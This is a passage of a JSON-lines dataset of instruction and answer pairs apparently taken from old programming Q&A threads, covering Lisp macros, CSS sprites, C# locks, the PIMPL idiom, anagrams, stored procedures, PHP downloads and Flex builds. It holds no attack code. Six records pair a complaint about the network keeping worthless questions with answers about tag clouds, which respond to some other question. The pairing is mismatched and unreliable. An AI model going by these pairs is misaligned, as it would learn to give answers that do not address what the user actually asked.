self-contained."}
{"instruction": "I've been working through Practical Common Lisp and as an exercise decided to write a macro to determine if a number is a multiple of another number:\n(defmacro multp (value factor)\n   `(= (rem ,value ,factor)  0))\nso that :\n(multp 40 10)\nevaluates to true whilst\n(multp 40 13)\ndoes not \nThe question is does this macro leak in some way?  Also is this \"good\" Lisp?  Is there already an existing function/macro that I could have used?", "output": "Siebel gives an extensive rundown (for simple cases anyway) of possible sources of leaks, and there aren't any of those here. Both value and factor are evaluated only once and in order, and rem doesn't have any side effects.\nThis is not good Lisp though, because there's no reason to use a macro in this case. A function\n(defun multp (value factor)\n  (zerop (rem value factor)))\n\nis identical for all practical purposes. (Note the use of zerop. I think it makes things clearer in this case, but in cases where you need to highlight, that the value you're testing might still be meaningful if it's something other then zero, (= ... 0) might be better)"}
{"instruction": "I've been working through Practical Common Lisp and as an exercise decided to write a macro to determine if a number is a multiple of another number:\n(defmacro multp (value factor)\n   `(= (rem ,value ,factor)  0))\nso that :\n(multp 40 10)\nevaluates to true whilst\n(multp 40 13)\ndoes not \nThe question is does this macro leak in some way?  Also is this \"good\" Lisp?  Is there already an existing function/macro that I could have used?", "output": "Your macro looks fine to me. I don't know what a leaky macro is, but yours is pretty straightforward and doesn't require any gensyms. As far as if this is \"good\" Lisp, my rule of thumb is to use a macro only when a function won't do, and in this case a function can be used in place of your macro. However, if this solution works for you there's no reason not to use it."}
{"instruction": "I've just coded a 700 line class. Awful. I hang my head in shame.  It's as opposite to DRY as a British summer.\nIt's full of cut and paste with minor tweaks here and there.  This makes it's a prime candidate for refactoring.  Before I embark on this, I'd thought I'd ask when you have lots of repetition, what are the first refactoring opportunities you look for?\nFor the record, mine are probably using:\n\nGeneric classes and methods\nMethod overloading/chaining.\n\nWhat are yours?", "output": "Sometimes by the time you \"complete functionality\" using copy and paste code, you've come to a point that it is maimed and mangled enough that any attempt at refactoring will actually take much, much longer than refactoring it at the point where it was obvious.\nIn my personal experience my favorite \"way of removing repetition\" has been the \"Extract Method\" functionality of Resharper (although this is also available in vanilla Visual Studio).\nMany times I would see repeated code (some legacy app I'm maintaining) not as whole methods but in chunks within completely separate methods. That gives a perfect opportunity to turn those chunks into methods.\nMonster classes also tend to reveal that they contain more than one functionality. That in turn becomes an opportunity to separate each distinct functionality into its own (hopefully smaller) class.\nI have to reiterate that doing all of these is not a pleasurable experience at all (for me), so I really would rather do it right while it's a small ball of mud, rather than let the big ball of mud roll and then try to fix that."}
{"instruction": "Is there a way to change the appearance of an icon (ie. contrast / luminosity) when I hover the cursor, without requiring a second image file (or without requiring a hidden portion of the image)?", "output": "The way I usually see things done with smaller images such as buttons it that only a certain portion of the image is shown. Then many states of the picture will make up a larger picture which gets shifted around behind the visible port. I'll delete this when someone has code."}
{"instruction": "Is there a way to change the appearance of an icon (ie. contrast / luminosity) when I hover the cursor, without requiring a second image file (or without requiring a hidden portion of the image)?", "output": "Here's some good information about image opacity and transparency with CSS.\nSo to make an image with opacity 50%, you'd do this:\n<img src=\"image.png\" style=\"opacity: 0.5; filter: alpha(opacity=50)\" />\n\nThe opacity: part is how Firefox does it, and it's a value between 0.0 and 1.0. filter: is how IE does it, and it's a value from 0 to 100."}
{"instruction": "Is there a way to change the appearance of an icon (ie. contrast / luminosity) when I hover the cursor, without requiring a second image file (or without requiring a hidden portion of the image)?", "output": "You don't use an img tag, but an element with a background-image css attribute and set the background-position on hover.  IE requires an 'a' tag as a parent element for the :hover selector.  They are called css sprites.\nA great article explaining how to use CSS sprites."}
{"instruction": "I'm trying to create a standard way of rolling out web applications for our company.  Currently we do it with zip files, vbscript/javascript, and manual some steps.  \nFor thick client installs we generate MSI installers using Wise/Wix.  We don't create installers currently for websites as in general they are just xcopy deploy.  However we have some config files that need to be changed, verify that certain handlers are registered in IIS...  The list goes on.\nDo most people use MSI installers for web applications as well, or some other tool/scripting language?", "output": "I work for a state agency and we do all our deployments using a product called RepliWeb.\nIt works good because as dev's we have no control over the webservers. But we can deploy to a deployment area and run the RepliWeb job to do the deployment. Not sure on pricing though..."}
{"instruction": "Is there a way to change the appearance of an icon (ie. contrast / luminosity) when I hover the cursor, without requiring a second image file (or without requiring a hidden portion of the image)?", "output": "here's some code to play with. basic idea: put all possible states of the picture into one big image; set a \"window size\", that's smaller then the image; move the window around using background-position\n<style type=\"text/css\" media=\"screen\">\n   #test {\n       display: block; width: 250px; height: 337px; /* window size */\n       background: url(http://vi.sualize.us/thumbs/08/09/01/fashion,indie,inspiration,portrait-f825c152cc04c3dbbb6a38174a32a00f_h.jpg) no-repeat; /* put the image */\n       border: 1px solid red; /* for debugging */\n       text-indent: -1000px; /* hide the text */\n   }\n   #test:hover {\n       background-position: -250px 0px; /* on mouse over move the window to a different part of the image */\n   }\n</style>\n\n<a href=\"#\" id=\"test\">a button</a>"}
{"instruction": "I understand the main function of the lock key word from MSDN\n\nlock Statement (C# Reference)\nThe lock keyword marks a statement\n  block as a critical section by\n  obtaining the mutual-exclusion lock\n  for a given object, executing a\n  statement, and then releasing the\n  lock.\n\nWhen should the lock be used?  \nFor instance it makes sense with multi-threaded applications because it protects the data.  But is it necessary when the application does not spin off any other threads?\nIs there performance issues with using lock?\nI have just inherited an application that is using lock everywhere, and it is single threaded and I want to know should I leave them in, are they even necessary?\nPlease note this is more of a general knowledge question, the application speed is fine, I want to know if that is a good design pattern to follow in the future or should this be avoided unless absolutely needed.", "output": "All the answers here seem right: locks' usefulness is to block threads from acessing locked code concurrently. However, there are many subtleties in this field, one of which is that locked blocks of code are automatically marked as critical regions by the Common Language Runtime.\nThe effect of code being marked as critical is that, if the entire region cannot be entirely executed, the runtime may consider that your entire Application Domain is potentially jeopardized and, therefore, unload it from memory. To quote MSDN:\n\nFor example, consider a task that attempts to allocate memory while holding a lock. If the memory allocation fails, aborting the current task is not sufficient to ensure stability of the AppDomain, because there can be other tasks in the domain waiting for the same lock. If the current task is terminated, other tasks could be deadlocked.\n\nTherefore, even though your application is single-threaded, this may be a hazard for you. Consider that one method in a locked block throws an exception that is eventually not handled within the block. Even if the exception is dealt as it bubbles up through the call stack, your critical region of code didn't finish normally. And who knows how the CLR will react?\nFor more info, read this article on the perils of Thread.Abort()."}
{"instruction": "I will never understand why the SE network insists that every worthless question has to exist forever.", "output": "It's a easy mechanism to determine which tags are most popular or how dense that tag is populated ( amount of tags). \nIt's just a intuative interface, I'm fairly certain that's one of the bigger reason's why they are so popular, that and they are very Web 2.0 also."}
{"instruction": "I will never understand why the SE network insists that every worthless question has to exist forever.", "output": "Because searching for php is not the same as viewing all posts that the owner has tagged as php.  Try it."}
{"instruction": "I will never understand why the SE network insists that every worthless question has to exist forever.", "output": "It's more of a browse assist than a search assist.  If you see a large or bold tag in a tag cloud that interests you it my lead to some knowledge discovery that wouldn't have otherwise been sought out with a deliberate search.  When I am browsing del.ico.us or stackoverflow I appreciate the tags as they sometimes lead me to discover related topics.\nWikipedia has an interesting definition:\n\nA tag cloud or word cloud (or weighted list in visual design) is a visual depiction of user-generated tags, or simply the word content of a site, used typically to describe the content of web sites. Tags are usually single words and are typically listed alphabetically, and the importance of a tag is shown with font size or color. [1] Thus both finding a tag by alphabet and by popularity is possible. The tags are usually hyperlinks that lead to a collection of items that are associated with a tag."}
{"instruction": "I will never understand why the SE network insists that every worthless question has to exist forever.", "output": "Tags give a way of explicitly labelling something with what it is about instead of relying on computers to extract this information.\nFor example, you might be interested in on questions about stackoverflow. If you search for \"stackoverflow\" you will get all kinds of questions that are not about stackoverflow at all (e.g. they only contain the word \"stackoverflow\" because there is some link to another question). By selecting questions that are tagged with \"stackoverflow\" you get only those post that people have explicitly identified as being about stackoverflow."}
{"instruction": "I have a 200+ case statement in Classic ASP which is getting out of control. It sets 5 variables, based on which case is selected. Address, Phone, Name etc. Just sets the variables and nothing else in each case.\nDatabases or files are not an option for this application.\nComing from the Perl world I would use a hash to store this info.", "output": "Scripting dictionary is the best option IMHO."}
{"instruction": "I will never understand why the SE network insists that every worthless question has to exist forever.", "output": "It helps you understand the focus of the page or site that you're looking at. What topics being discussed the most? What kinds of information will I find here?\nIf you search for something related to Java and land on two sites, one with a tag cloud showing 'Java' is prominent, and one where Java is almost invisible but 'C#' is prominent it's pretty easy to quickly decide which site is most valuable to you."}
{"instruction": "I will never understand why the SE network insists that every worthless question has to exist forever.", "output": "Why would I need a \"cloud\" of tags upon which to click? I can just type that tag(s) into a search box. What am I missing?\n\nHow do you know what tags are available to type without a lot of trial and error?  Even if you know what tags are available, how do you know which are most popular without a bunch more trial and error?"}
{"instruction": "I will never understand why the SE network insists that every worthless question has to exist forever.", "output": "The thing that makes a tag cloud really useful (at least a well implemented tag cloud IMO) is the ability to drill into a topic deeper and deeper.   \nFor example, I could click \"Topic A\" and then I can see the items in the tag cloud for all tags within the \"Topic A\" items. I can then drill into one of those sub topic and narrow the items even further.  \nThe stackoverflow tag cloud doesn't do this (which is too bad), but if it did, I could click something like \"visualstudio\" to drill into the threads tagged visualstudio then click \"asp.net\" to drill into that, then \"javascript\". The end result would be a list of all items tagged all three \"visualstudio\", \"asp.net\" and \"javascript\". This is where a tag cloud becomes really useful. Unfortunately, not all tag clouds work this way (but IMO they should)."}
{"instruction": "What experience can you share about using multiple AJAX libraries?\nThere are useful features in Prototype, some in jQuery, the Yahoo library, etc. Is it possible to include all libraries and use what you want from each, do they generally all play nicely together with name spaces, etc. For the sake of speed is there a practical limit to the size/number of libraries to include or is this negligible? Are there pairs that work particularly well together (e.g. Prototype/Scriptaculous) or pairs that don't?", "output": "I'm using jQuery and the javascript file only version of the Microsof ajax tool kit side by side in project right now.\nI think I'm going to go with jQuery and end up removing the Microsoft one.  I'm very new to jQuery, but the more I learn about it, the more enamoured I get."}
{"instruction": "Okay, here is the 411 - I have the following event handler in my Global.asax.cs file:\nprivate void Global_PostRequestHandlerExecute(object sender, EventArgs e)\n{\n   if (/* logic that determines that this is an ajax call */)\n   {\n      // we want to set a cookie\n      Response.Cookies.Add(new HttpCookie(\"MyCookie\", \"true\"));\n   }\n}\n\nThat handler will run during Ajax requests (as a result of the Ajax framework I am using), as well as at other times - the condition of the if statement filters out non-Ajax events, and works just fine (it isn't relevant here, so I didn't include it for brevity's sake).\nIt suffices us to say that this works just fine - the cookie is set, I am able to read it on the client, and all is well up to that point.\nNow for the part that drives me nuts.\nHere is the JavaScript function I am using to delete the cookie:\nfunction deleteCookie(name) {\n   var cookieDate = new Date();\n   cookieDate.setTime(cookieDate.getTime() - 1);\n   document.cookie = (name + \"=; expires=\" + cookieDate.toGMTString());\n}\n\nSo, of course, at some point after the cookie is set, I delete it like so:\ndeleteCookie(\"MyCookie\");\n\nOnly, that doesn't do the job; the cookie still exists. So, anyone know why?", "output": "Are we sure there's no code that sets the Cookie to HttpOnly (we're not missing anything above)? The HttpOnly property will stop (modern) browsers from modifying the cookie. I'd be interested to see if you can kill it server side like Rob suggests."}
{"instruction": "I'm writing an asp.net application that will need to be localized to several regions other than North America.  What do I need to do to prepare for this globalization?  What are your top 1 to 2 resources for learning how to write a world ready application.", "output": "I would seriously consider reading the following code project article:\nGlobalization and localization demystified in ASP.NET 2.0\nIt covers everything from Cultures and Locales, setting the threads current culture, resource files, encodings, you name it!\nAnd of course it's loaded with pretty pictures and examples :-). Good luck!"}
{"instruction": "What experience can you share about using multiple AJAX libraries?\nThere are useful features in Prototype, some in jQuery, the Yahoo library, etc. Is it possible to include all libraries and use what you want from each, do they generally all play nicely together with name spaces, etc. For the sake of speed is there a practical limit to the size/number of libraries to include or is this negligible? Are there pairs that work particularly well together (e.g. Prototype/Scriptaculous) or pairs that don't?", "output": "I'm a jQuery believer as well, so pardon my lack of knowledge about the others, but ...\nWhat makes jQuery so great is the no-conflict mode, so for example, you would do:\n$('#foobar').whatever();\n\nWith no-conflict mode, you'd do this:\nvar jq = jQuery.noConflict();\njq('#foobar').whatever();\n\nOne less thing to worry about. I'd imagine prototype offers a similar feature, and Yahoo as well.\nBut anyway, I'd don't want to advocate jQuery too much and make people mad, but whatever library you select, I think they all can do pretty much of everything you would need. Especially think about the benefits of not having to learn three different libraries.\nAll three should be capable. Select the one you like best and extend it. :)"}
{"instruction": "What experience can you share about using multiple AJAX libraries?\nThere are useful features in Prototype, some in jQuery, the Yahoo library, etc. Is it possible to include all libraries and use what you want from each, do they generally all play nicely together with name spaces, etc. For the sake of speed is there a practical limit to the size/number of libraries to include or is this negligible? Are there pairs that work particularly well together (e.g. Prototype/Scriptaculous) or pairs that don't?", "output": "Ruby on Rails uses both prototype and Scriptaculous by default, as there is little overlap between the two. I've also used yui snippets in addition to that and have never had a problem. Load times are an issue, but the libraries are usually cached, so it's only on the first page loaded."}
{"instruction": "If I'm running a signed Java applet, can I load additional classes from remote sources (in the same domain, maybe even the same host) and run them?\nI'd like to do this without changing pages or even stopping the current applet. Of course, the total size of all classes is too large to load them all at once.\nIs there a way to do this? And is there a way to do this with signed applets and preserve their \"confidence\" status?", "output": "Sounds like it should be possible (but I've never done it). Have you already had a look at Remote Method Invocation (RMI)?"}
{"instruction": "Backgrounder:\nThe PIMPL Idiom (Pointer to IMPLementation) is a technique for implementation hiding in which a public class wraps a structure or class that cannot be seen outside the library the public class is part of.\nThis hides internal implementation details and data from the user of the library.\nWhen implementing this idiom why would you place the public methods on the pimpl class and not the public class since the public classes method implementations would be compiled into the library and the user only has the header file?\nTo illustrate, this code puts the Purr() implementation on the impl class and wraps it as well.\nWhy not implement Purr directly on the public class?\n// header file:\nclass Cat {\n    private:\n        class CatImpl;  // Not defined here\n        CatImpl *cat_;  // Handle\n\n    public:\n        Cat();            // Constructor\n        ~Cat();           // Destructor\n        // Other operations...\n        Purr();\n};\n\n\n// CPP file:\n#include \"cat.h\"\n\nclass Cat::CatImpl {\n    Purr();\n...     // The actual implementation can be anything\n};\n\nCat::Cat() {\n    cat_ = new CatImpl;\n}\n\nCat::~Cat() {\n    delete cat_;\n}\n\nCat::Purr(){ cat_->Purr(); }\nCatImpl::Purr(){\n   printf(\"purrrrrr\");\n}", "output": "Placing the call to the impl->Purr inside the cpp file means that in the future you could do something completely different without having to change the header file. Maybe next year they discover a helper method they could have called instead and so they can change the code to call that directly and not use impl->Purr at all. (Yes, they could achieve the same thing by updating the actual impl::Purr method as well but in that case you are stuck with an extra function call that achieves nothing but calling the next function in turn)\nIt also means the header only has definitions and does not have any implementation which makes for a cleaner separation, which is the whole point of the idiom."}
{"instruction": "Backgrounder:\nThe PIMPL Idiom (Pointer to IMPLementation) is a technique for implementation hiding in which a public class wraps a structure or class that cannot be seen outside the library the public class is part of.\nThis hides internal implementation details and data from the user of the library.\nWhen implementing this idiom why would you place the public methods on the pimpl class and not the public class since the public classes method implementations would be compiled into the library and the user only has the header file?\nTo illustrate, this code puts the Purr() implementation on the impl class and wraps it as well.\nWhy not implement Purr directly on the public class?\n// header file:\nclass Cat {\n    private:\n        class CatImpl;  // Not defined here\n        CatImpl *cat_;  // Handle\n\n    public:\n        Cat();            // Constructor\n        ~Cat();           // Destructor\n        // Other operations...\n        Purr();\n};\n\n\n// CPP file:\n#include \"cat.h\"\n\nclass Cat::CatImpl {\n    Purr();\n...     // The actual implementation can be anything\n};\n\nCat::Cat() {\n    cat_ = new CatImpl;\n}\n\nCat::~Cat() {\n    delete cat_;\n}\n\nCat::Purr(){ cat_->Purr(); }\nCatImpl::Purr(){\n   printf(\"purrrrrr\");\n}", "output": "I think most people refer to this as the Handle Body idiom. See James Coplien's book Advanced C++ Programming Styles and Idioms (Amazon link). It's also known as the Cheshire Cat because of Lewis Caroll's character that fades away until only the grin remains.\nThe example code should be distributed across two sets of source files. Then only Cat.h is the file that is shipped with the product.\nCatImpl.h is included by Cat.cpp and CatImpl.cpp contains the implementation for CatImpl::Purr(). This won't be visible to the public using your product.\nBasically the idea is to hide as much as possible of the implementation fom prying eyes.\nThis is most useful where you have a commercial product that is shipped as a series of libraries that are accessed via an API that the customer's code is compiled against and linked to.\nWe did this with the rewrite of IONAs Orbix 3.3 product in 2000.\nAs mentioned by others, using his technique completely decouples the implementation from the interface of the object. Then you won't have to recompile everything that uses Cat if you just want to change the implementation of Purr().\nThis technique is used in a methodology called design by contract."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "Realising this is a bit off-topic to the question, but if you are using a lot of stored procedures, make sure there is a consistent way to put them under some sort of source control (e.g., subversion or git) and be able to migrate updates from your development system to the test system to the production system.\nWhen this is done by hand, with no way to easily audit what code is where, this quickly becomes a nightmare."}
{"instruction": "Backgrounder:\nThe PIMPL Idiom (Pointer to IMPLementation) is a technique for implementation hiding in which a public class wraps a structure or class that cannot be seen outside the library the public class is part of.\nThis hides internal implementation details and data from the user of the library.\nWhen implementing this idiom why would you place the public methods on the pimpl class and not the public class since the public classes method implementations would be compiled into the library and the user only has the header file?\nTo illustrate, this code puts the Purr() implementation on the impl class and wraps it as well.\nWhy not implement Purr directly on the public class?\n// header file:\nclass Cat {\n    private:\n        class CatImpl;  // Not defined here\n        CatImpl *cat_;  // Handle\n\n    public:\n        Cat();            // Constructor\n        ~Cat();           // Destructor\n        // Other operations...\n        Purr();\n};\n\n\n// CPP file:\n#include \"cat.h\"\n\nclass Cat::CatImpl {\n    Purr();\n...     // The actual implementation can be anything\n};\n\nCat::Cat() {\n    cat_ = new CatImpl;\n}\n\nCat::~Cat() {\n    delete cat_;\n}\n\nCat::Purr(){ cat_->Purr(); }\nCatImpl::Purr(){\n   printf(\"purrrrrr\");\n}", "output": "Typically, the only reference to Pimpl class in the header for the Owner class (Cat in this case) would be a forward declaration, as you have done here, because that can greatly reduce the dependencies.\nFor example, if your Pimpl class has ComplicatedClass as a member (and not just a pointer or reference to it) then you would need to have ComplicatedClass fully defined before it's use. In practice, this means including \"ComplicatedClass.h\" (which will also indirectly include anything ComplicatedClass depends on). This can lead to a single header fill pulling in lots and lots of stuff, which is bad for managing your dependencies (and your compile times).\nWhen you use the pimpl idion, you only need to #include the stuff used in the public interface of your Owner type (which would be Cat here). Which makes things better for people using your library, and means you don't need to worry about people depending on some internal part of your library - either by mistake, or because they want to do something you don't allow so they #define private public before including your files.\nIf it's a simple class, there's usually no reason to use a Pimpl, but for times when the types are quite big, it can be a big help (especially in avoiding long build times)"}
{"instruction": "What would be the best strategy to generate anagrams.\n\nAn anagram is a type of word play, the result of rearranging the letters\nof a word or phrase to produce a new  word or phrase, using all the original\nletters exactly once; \nex.\n\n\nEleven plus two is anagram of Twelve plus one \nA decimal point is anagram of I'm a dot in place\nAstronomers is anagram of Moon starers\n\n\nAt first it looks straightforwardly simple, just to jumble the letters and generate all possible combinations. But what would be the efficient approach to generate only the words in dictionary.\nI came across this page, Solving anagrams in Ruby. \nBut what are your ideas?", "output": "I've used the following way of computing anagrams a couple of month ago: \n\nCompute a \"code\" for each word in your dictionary: Create a lookup-table from letters in the alphabet to prime numbers, e.g. starting with ['a', 2] and ending with ['z', 101]. As a pre-processing step compute the code for each word in your dictionary by looking up the prime number for each letter it consists of in the lookup-table and multiply them together. For later lookup create a multimap of codes to words.\nCompute the code of your input word as outlined above.\nCompute codeInDictionary % inputCode for each code in the multimap. If the result is 0, you've found an anagram and you can lookup the appropriate word. This also works for 2- or more-word anagrams as well.\n\nHope that was helpful."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "The one topic that no one has yet mentioned as a benefit of stored procedures is security.  If you build the application exclusively with data access via stored procedures, you can lockdown the database so the ONLY access is via those stored procedures.  Therefor, even if someone gets a database ID and password, they will be limited in what they can see or do against that database."}
{"instruction": "On a PHP-based web site, I want to send users a download package after they have filled out a short form. The site-initiated download should be similar to sites like download.com, which say \"your download will begin in a moment.\"\nA couple of possible approaches I know about, and browser compatibility (based on a quick test):\n1) Do a window.open pointing to the new file. \n- FireFox 3 blocks this.  \n - IE6 blocks this.  \n - IE7 blocks this.\n\n2) Create an iframe pointing to the new file. \n- FireFox 3 seems to think this is OK. (Maybe it's because I already accepted it once?)  \n - IE6 blocks this.  \n - IE7 blocks this.\n\nHow can I do this so that at least these three browsers will not object? \n\nBonus: is there a method that doesn't require browser-conditional statements? \n(I believe that download.com employs both methods conditionally, but I can't get either one to work.)\nResponses and Clarifications:\nQ: \"Why not point the current window to the file?\"  \nA: That might work, but in this particular case, I want to show them some other content while their download starts - for example, \"would you like to donate to this project?\"\n\nUPDATE: I have abandoned this approach. See my answer below for reasons.", "output": "How about changing the location to point to the new file? (e.g. by changing window.location)"}
{"instruction": "Backgrounder:\nThe PIMPL Idiom (Pointer to IMPLementation) is a technique for implementation hiding in which a public class wraps a structure or class that cannot be seen outside the library the public class is part of.\nThis hides internal implementation details and data from the user of the library.\nWhen implementing this idiom why would you place the public methods on the pimpl class and not the public class since the public classes method implementations would be compiled into the library and the user only has the header file?\nTo illustrate, this code puts the Purr() implementation on the impl class and wraps it as well.\nWhy not implement Purr directly on the public class?\n// header file:\nclass Cat {\n    private:\n        class CatImpl;  // Not defined here\n        CatImpl *cat_;  // Handle\n\n    public:\n        Cat();            // Constructor\n        ~Cat();           // Destructor\n        // Other operations...\n        Purr();\n};\n\n\n// CPP file:\n#include \"cat.h\"\n\nclass Cat::CatImpl {\n    Purr();\n...     // The actual implementation can be anything\n};\n\nCat::Cat() {\n    cat_ = new CatImpl;\n}\n\nCat::~Cat() {\n    delete cat_;\n}\n\nCat::Purr(){ cat_->Purr(); }\nCatImpl::Purr(){\n   printf(\"purrrrrr\");\n}", "output": "You may find Herb Sutter's article GotW 24: Compilation Firewalls useful."}
{"instruction": "On a PHP-based web site, I want to send users a download package after they have filled out a short form. The site-initiated download should be similar to sites like download.com, which say \"your download will begin in a moment.\"\nA couple of possible approaches I know about, and browser compatibility (based on a quick test):\n1) Do a window.open pointing to the new file. \n- FireFox 3 blocks this.  \n - IE6 blocks this.  \n - IE7 blocks this.\n\n2) Create an iframe pointing to the new file. \n- FireFox 3 seems to think this is OK. (Maybe it's because I already accepted it once?)  \n - IE6 blocks this.  \n - IE7 blocks this.\n\nHow can I do this so that at least these three browsers will not object? \n\nBonus: is there a method that doesn't require browser-conditional statements? \n(I believe that download.com employs both methods conditionally, but I can't get either one to work.)\nResponses and Clarifications:\nQ: \"Why not point the current window to the file?\"  \nA: That might work, but in this particular case, I want to show them some other content while their download starts - for example, \"would you like to donate to this project?\"\n\nUPDATE: I have abandoned this approach. See my answer below for reasons.", "output": "I usually just have a PHP script that outputs the file directly to the browser with the appropriate Content-Type\nif( file_exists($filename) ){\n        header(\"Pragma:  public\");\n        header(\"Expires:  0\");\n        header(\"Cache-Control:  must-revalidate, pre-check=0\");\n        header(\"Cache-Control:  private\", false);\n        header(\"Content-Type:  \" . $content-type);\n        header(\"Content-Disposition:  attachment; filename=\\\"\" . basename($filename) . \"\\\";\" );\n        header(\"Content-Transfer-Encoding:  binary\");\n        header(\"Content-Length:  \" . filesize($filename));\n\n        readfile(\"$filename\");\n}else{\n        print \"ERROR:  the file \" . basename($filename) . \" could not be downloaded because it did not exist.\";\n}\n\nThe only disadvantage is that, since this sets the HTTP header, it has be called before you have any other output.\nBut you can have a link to the PHP download page and it will cause the browser to pop up a download box without messing up the content of the current page."}
{"instruction": "Backgrounder:\nThe PIMPL Idiom (Pointer to IMPLementation) is a technique for implementation hiding in which a public class wraps a structure or class that cannot be seen outside the library the public class is part of.\nThis hides internal implementation details and data from the user of the library.\nWhen implementing this idiom why would you place the public methods on the pimpl class and not the public class since the public classes method implementations would be compiled into the library and the user only has the header file?\nTo illustrate, this code puts the Purr() implementation on the impl class and wraps it as well.\nWhy not implement Purr directly on the public class?\n// header file:\nclass Cat {\n    private:\n        class CatImpl;  // Not defined here\n        CatImpl *cat_;  // Handle\n\n    public:\n        Cat();            // Constructor\n        ~Cat();           // Destructor\n        // Other operations...\n        Purr();\n};\n\n\n// CPP file:\n#include \"cat.h\"\n\nclass Cat::CatImpl {\n    Purr();\n...     // The actual implementation can be anything\n};\n\nCat::Cat() {\n    cat_ = new CatImpl;\n}\n\nCat::~Cat() {\n    delete cat_;\n}\n\nCat::Purr(){ cat_->Purr(); }\nCatImpl::Purr(){\n   printf(\"purrrrrr\");\n}", "output": "Because you want Purr() to be able to use private members of CatImpl.  Cat::Purr() would not be allowed such an access without a friend declaration.\nBecause you then don't mix responsibilities: one class implements, one class forwards."}
{"instruction": "On a PHP-based web site, I want to send users a download package after they have filled out a short form. The site-initiated download should be similar to sites like download.com, which say \"your download will begin in a moment.\"\nA couple of possible approaches I know about, and browser compatibility (based on a quick test):\n1) Do a window.open pointing to the new file. \n- FireFox 3 blocks this.  \n - IE6 blocks this.  \n - IE7 blocks this.\n\n2) Create an iframe pointing to the new file. \n- FireFox 3 seems to think this is OK. (Maybe it's because I already accepted it once?)  \n - IE6 blocks this.  \n - IE7 blocks this.\n\nHow can I do this so that at least these three browsers will not object? \n\nBonus: is there a method that doesn't require browser-conditional statements? \n(I believe that download.com employs both methods conditionally, but I can't get either one to work.)\nResponses and Clarifications:\nQ: \"Why not point the current window to the file?\"  \nA: That might work, but in this particular case, I want to show them some other content while their download starts - for example, \"would you like to donate to this project?\"\n\nUPDATE: I have abandoned this approach. See my answer below for reasons.", "output": "You can also do a meta refresh, which most browsers support.  Download.com places one in a noscript tag.\n<meta http-equiv=\"refresh\" content=\"5;url=/download.php?doc=123.zip\"/>"}
{"instruction": "We have a recurring problem at my company with build breaks in our Flex projects. The problem primarily occurs because the build that the developers do on their local machines is fundamentally different from the build that occurs on the build machine. The devs are building the projects using FlexBuilder/eclipse and the build machine is using the command line compilers. Inevitably, the {projectname}-config.xml and/or the batch file that runs the build get out of sync with the project files used by eclipse, so the the build succeeds on the dev's machine, but fails on the build machine.\nWe started down the path of writing a utility program to convert FlexBuilder's project files into a {projectname}-config.xml file, but it's a) undocumented and b) a horrible hack.\nI've looked into the -dump-config switch to get the config files, but this has a couple of problems: 1) The generated config file has absolute paths which doesn't work in our environment (some developers use macs, some windows machines), and 2) only works right when run from the IDE, so can't be build into the build process.\nTomorrow, we are going to discuss a couple of options, neither of which I'm terribly fond of:\na) Add a post check-in event to Subversion to remove these absolute references, or \nb) add a pre-build process that removes the absolute reference.\nI can't believe that we are the first group of developers to run across this issue, but I can't find any good solutions on Google. How have other groups dealt with this problem?", "output": "I found that one of the undocumented requirements for using ant with Flexbuilder was to have the variable FLEX_HOME set within your ant script. Typically within build.xml have the following:\n<!\u2013 Module properties \u2013>\n<property environment=\u201denv\u201d/>\n<property name=\u201dbuild.dir\u201d value=\u201dbuild\u201d/>\n<property name=\u201dswf.name\u201d value=\u201dMyProjectSwf\u201d/>\n<property name=\u201droot.mxml\u201d value=\u201dMain.mxml\u201d/>\n<property name=\u201dlocale\u201d value=\u201den_US\u201d/>\n<property name=\u201dFLEX_HOME\u201d value=\u201d${env.FLEX_HOME}\u201d/>\n\nThis may seem like a hassle but it is a far more reasonable approach to obtaining consistency across platforms and environments if you are using multiple platforms for your developers.\nHTH"}
{"instruction": "If I'm running a signed Java applet, can I load additional classes from remote sources (in the same domain, maybe even the same host) and run them?\nI'd like to do this without changing pages or even stopping the current applet. Of course, the total size of all classes is too large to load them all at once.\nIs there a way to do this? And is there a way to do this with signed applets and preserve their \"confidence\" status?", "output": "I think classes are lazy loaded in applets. being loaded on demand.\nAnyway, if the classes are outside of a jar you can simply use the applet classloader and load them by name. Ex:\nClassLoader loader = this.getClass().getClassLoader();\nClass clazz = loader.loadClass(\"acme.AppletAddon\");\n\nIf you want to load classes from a jar I think you will need to create a new instance of URLClassLoader with the url(s) of the jar(s).\nURL[] urls = new URL[]{new URL(\"http://localhost:8080/addon.jar\")};\nURLClassLoader loader = URLClassLoader.newInstance(urls,this.getClass().getClassLoader());\nClass clazz = loader.loadClass(\"acme.AppletAddon\");\n\nBy default, applets are forbidden to create new classloaders. But if you sign your applet and include permission to create new classloaders you can do it."}
{"instruction": "Backgrounder:\nThe PIMPL Idiom (Pointer to IMPLementation) is a technique for implementation hiding in which a public class wraps a structure or class that cannot be seen outside the library the public class is part of.\nThis hides internal implementation details and data from the user of the library.\nWhen implementing this idiom why would you place the public methods on the pimpl class and not the public class since the public classes method implementations would be compiled into the library and the user only has the header file?\nTo illustrate, this code puts the Purr() implementation on the impl class and wraps it as well.\nWhy not implement Purr directly on the public class?\n// header file:\nclass Cat {\n    private:\n        class CatImpl;  // Not defined here\n        CatImpl *cat_;  // Handle\n\n    public:\n        Cat();            // Constructor\n        ~Cat();           // Destructor\n        // Other operations...\n        Purr();\n};\n\n\n// CPP file:\n#include \"cat.h\"\n\nclass Cat::CatImpl {\n    Purr();\n...     // The actual implementation can be anything\n};\n\nCat::Cat() {\n    cat_ = new CatImpl;\n}\n\nCat::~Cat() {\n    delete cat_;\n}\n\nCat::Purr(){ cat_->Purr(); }\nCatImpl::Purr(){\n   printf(\"purrrrrr\");\n}", "output": "If your class uses the pimpl idiom, you can avoid changing the header file on the public class.\nThis allows you to add/remove methods to the pimpl class, without modifying the external class's header file. You can also add/remove #includes to the pimpl too.\nWhen you change the external class's header file, you have to recompile everything that #includes it (and if any of those are header files, you have to recompile everything that #includes them, and so on)"}
